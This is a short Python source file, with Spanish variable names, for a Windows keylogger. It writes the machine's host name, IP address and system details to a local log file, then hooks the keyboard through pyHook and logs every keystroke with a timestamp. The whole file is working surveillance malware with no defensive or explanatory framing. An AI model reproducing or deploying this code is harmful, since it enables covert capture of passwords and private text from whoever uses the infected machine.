import pyHook, pythoncom, sys, logging, socket
import platform as pl

archivo_registro = 'keyloggersalida.txt'

perfil_so = [
    'architecture',
    'machine',
    'uname',
    ]

nombre_usuario = socket.gethostname()
direccion_ip = socket.gethostbyname(nombre_usuario)

f = open(archivo_registro,'a')
f.write('nombre de usuario : %s' % nombre_usuario)
f.write('direccion ip : %s' % direccion_ip)
f.close()

for perfil in perfil_so:
    if hasattr(pl, perfil):
        f = open(archivo_registro,'a')
        f.write('%s: %s' % (perfil, getattr(pl, perfil)()))
        f.close()

def EventoTeclado(evento):
    logging.basicConfig(filename=archivo_registro, level=logging.DEBUG, format='%(asctime)s: %(message)s')
    logging.log(10,chr(evento.KeyID))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = EventoTeclado
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
